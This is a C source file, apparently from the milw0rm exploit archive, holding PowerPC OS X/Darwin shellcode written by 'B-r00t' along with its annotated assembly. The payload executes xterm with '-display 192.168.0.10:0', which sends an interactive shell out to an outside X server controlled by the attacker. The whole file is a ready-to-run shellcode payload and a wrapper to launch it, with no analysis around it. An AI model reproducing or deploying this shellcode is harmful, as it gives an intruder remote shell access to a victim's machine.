/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does execve(/usr/X11R6/bin/xterm -display 192.168.0.10:0) exit(0);
See ASM below.
141 Bytes.
*/

char shellcode[] =
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
"\x7f\xe8\x02\xa6\x39\x5f\x01\x70"
"\x39\x0a\xfe\xfc\x7c\xa8\x29\xae"
"\x39\x0a\xff\x05\x7c\xa8\x29\xae"
"\x39\x0a\xff\x14\x7c\xa8\x29\xae"
"\x38\x6a\xff\x06\x90\x61\xff\xf8"
"\x38\x6a\xfe\xfd\x90\x61\xff\xf4"
"\x38\x6a\xfe\xe8\x90\x61\xff\xf0"
"\x90\xa1\xff\xfc\x38\x81\xff\xf0"
"\x3b\xc0\x01\x70\x38\x1e\xfe\xcb"
"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
"\x38\x1e\xfe\x91\x44\xff\xff\x02"
"\x2f\x75\x73\x72\x2f\x58\x31\x31"
"\x52\x36\x2f\x62\x69\x6e\x2f\x78"
"\x74\x65\x72\x6d\x2a\x2d\x64\x69"
"\x73\x70\x6c\x61\x79\x2a\x31\x39"
"\x32\x2e\x31\x36\x38\x2e\x30\x2e"
"\x31\x30\x3a\x30\x2a";

int main (void)
{
        __asm__("b _shellcode");
}


/*
; PPC OS X / Darwin Shellcode by B-r00t.
; execve(/usr/X11R6/bin/xterm -display 192.168.0.10:0) exit(0)
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main
        mflr    r31
        addi	r10, r31, 368
	addi    r8, r10, -260
        stbx    r5, r8, r5
	addi    r8, r10, -251
        stbx    r5, r8, r5
	addi    r8, r10, -236
        stbx    r5, r8, r5
	addi    r3, r10, -250
        stw     r3, -8(r1)
	addi    r3, r10, -259
        stw     r3, -12(r1)
	addi    r3, r10, -280
        stw     r3, -16(r1)
        stw     r5, -4(r1)
        subi    r4, r1, 16
        li      r30, 368
        addi    r0, r30, -309
        .long   0x44ffff02
        mr      r3, r5
        addi    r0, r30, -367
        .long   0x44ffff02
path:   .asciz  "/usr/X11R6/bin/xterm*-display*192.168.0.10:0*"

*/

// milw0rm.com [2004-09-26]